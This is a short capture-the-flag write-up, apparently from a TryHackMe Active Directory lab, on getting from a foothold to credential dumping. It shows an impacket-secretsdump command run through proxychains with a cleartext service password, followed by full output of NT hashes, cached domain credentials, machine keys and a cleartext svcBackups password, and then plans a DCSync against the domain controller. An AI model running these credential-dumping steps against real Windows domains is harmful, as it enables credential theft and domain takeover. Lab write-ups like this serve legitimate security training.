# Get 2 flags by rdp
### Foothold on Corporate Division Tier 1 Infrastructure
### Administrative access to Corporate Division Tier 1 Infrastructure

# DCSync Attack
Once attackers compromise a Windows endpoint, they can find credentials stored in the form of a hash or a clear-text password. Several handy techniques are available to dump credentials from a compromised Windows endpoint. For example, an attacker can obtain credentials from LSASS Memory, the SAM database, Cached Domain Credentials, or by abusing Replicating Directory permissions. They can use these obtained credentials to perform lateral movement and gain a greater level of access.

I failed to attack DC directly by using `-just-dc`

Run bloodhound if you haven't.

# Get other user's hash(Lateral movement)
Even we are already admin privilege, it might still password reuse to leverage.

Just remember to use the correct domain name 
```bash
proxychains impacket-secretsdump corp.thereserve.loc/svcScanning:'Password1!'@$IP

Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[proxychains] Strict chain  ...  127.0.0.1:1085  ...  10.200.113.31:445  ...  OK
[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x90cf5c2fdcffe9d25ff0ed9b3d14a846
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e2c7044e93cf7e4d8697582207d6785c:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:58f8e0214224aebc2c5f82fb7cb47ca1:::
THMSetup:1008:aad3b435b51404eeaad3b435b51404ee:d37f688ca5172b5976b714a8b54b40f4:::
HelpDesk:1009:aad3b435b51404eeaad3b435b51404ee:f6ca2f672e731b37150f0c5fa8cfafff:::
sshd:1010:aad3b435b51404eeaad3b435b51404ee:48c62694fd5bbca286168e2199f9af49:::
[*] Dumping cached domain logon information (domain/username:hash)
CORP.THERESERVE.LOC/Administrator:$DCC2$10240#Administrator#b08785ec00370a4f7d02ef8bd9b798ca
CORP.THERESERVE.LOC/svcScanning:$DCC2$10240#svcScanning#d53a09b9e4646451ab823c37056a0d6b
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
CORP\SERVER1$:aes256-cts-hmac-sha1-96:dcdfa637ffb922cc2c0786250db473559a6d2ecfe303872ead2e86fc37093cb8
CORP\SERVER1$:aes128-cts-hmac-sha1-96:cd192f0d47cd1fff976238f579ff54c3
CORP\SERVER1$:des-cbc-md5:0b2ff734517629b0
CORP\SERVER1$:plain_password_hex:51d98e2c3e5e05259aa36a09b0432d1d397a1b0bbce0ddc2bcf1e5307285edd6babca8b4e3c90a9770ab037896ac0db5d3e83bac9b51e32c5029b1227627b0bb3f9a4a28e0e2c7fff4a6207ab2b1d11b851756995f5df73473b0de408db38ddd89991847da60826a079dea630ee2c70955477d34f33c2d24762befb49520e46620cfdd0224094db00959f7fa55169b8ea1fd97a2d55a1971f563df37e504026adec3abb47ccfcf321c1e77d0641ce50bcd62790ebf86921269d9e4e80577436c19930dfe320d3705ec6ac7835966ba9a5bb50c253336c176dceadae3edcdeda07a1894be74f026a916431b5f6a089e13
CORP\SERVER1$:aad3b435b51404eeaad3b435b51404ee:53bcfaee75a2bd757bcae3571e6dd3a9:::
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xb4cfb5032a98c1b279c92264915da1fd3d8b1a0d
dpapi_userkey:0x3cddfc2ba786e51edf1c732a21ffa1f3d19aa382
[*] NL$KM 
 0000   8D D2 8E 67 54 58 89 B1  C9 53 B9 5B 46 A2 B3 66   ...gTX...S.[F..f
 0010   D4 3B 95 80 92 7D 67 78  B7 1D F9 2D A5 55 B7 A3   .;...}gx...-.U..
 0020   61 AA 4D 86 95 85 43 86  E3 12 9E C4 91 CF 9A 5B   a.M...C........[
 0030   D8 BB 0D AE FA D3 41 E0  D8 66 3D 19 75 A2 D1 B2   ......A..f=.u...
NL$KM:8dd28e67545889b1c953b95b46a2b366d43b9580927d6778b71df92da555b7a361aa4d8695854386e3129ec491cf9a5bd8bb0daefad341e0d8663d1975a2d1b2
[*] _SC_SYNC 
svcBackups@corp.thereserve.loc:q9nzssaFtGHdqUV3Qv6G
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
```

`svcBackups@corp.thereserve.loc:q9nzssaFtGHdqUV3Qv6G` <- Check bloodhound for this user

Let's run it again but against the DC as it has DCSync privilege.

-> Go to CORPDC